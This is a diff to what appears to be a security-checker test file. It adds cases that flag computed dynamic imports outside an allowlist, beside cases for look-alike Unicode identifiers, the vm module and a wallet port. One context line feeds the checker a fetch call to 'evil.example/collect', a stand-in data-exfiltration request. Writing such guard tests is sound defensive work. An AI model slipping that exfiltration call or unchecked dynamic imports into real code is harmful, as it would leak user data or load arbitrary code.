@@ -124,6 +124,11 @@ const CASES: Array<{ name: string; file: string; text: string; mode?: 'create'; 
   { name: "a look-alike letter in an identifier (Cyrillic s)", file: 'src/core/bsv/state.ts', text: "const \u0455ignAction = 1; void \u0455ignAction;", expect: /non-ASCII/ },
   { name: "the default wallet port in the probe file", file: 'src/core/bsv/wallet-probe.ts', text: "const DEFAULT_WALLET_URL = 'http://127.0.0.1:' + '33' + '21';", expect: /3321/ },
   { name: "the vm module in the BSV area", file: 'src/core/bsv/state.ts', text: "import vm from 'node:vm'; void vm;", expect: /code-running module|vm/ },
+  // a computed import() is allowed only in the one file that is on the list (the local model's helper process)
+  { name: 'a computed import(x) in a file that is not on the allowlist', file: 'src/core/armory/finder/rank.ts', text: 'export const loadIt = (x: string) => import(x);', expect: /dynamic import/ },
+  { name: 'a computed import(x) built from a template in a file that is not on the allowlist', file: 'src/core/armory/finder/bm25.ts', text: 'export const loadIt2 = (x: string) => import(`file:///${x}`);', expect: /dynamic import/ },
+  { name: 'a computed import(x) in the BSV area', file: 'src/core/bsv/state.ts', text: 'export const loadIt3 = (x: string) => import(x);', expect: /dynamic import/ },
+  { name: 'a computed import(x) in a second file next to the allowlisted worker', file: 'src/core/armory/finder/local-model.ts', text: 'export const loadIt4 = (x: string) => import(x);', expect: /dynamic import/ },
   // an allowlisted file may do its one job, nothing else
   { name: 'WalletClient inside an allowlisted file', file: 'src/electron/main.ts', text: '// WalletClient', expect: /WalletClient/i },
   { name: 'a non-loopback URL inside an allowlisted network file', file: 'src/bin/legion-mcp-stdio.ts', text: "void fetch('https://evil.example/collect');", expect: /loopback|host/i },
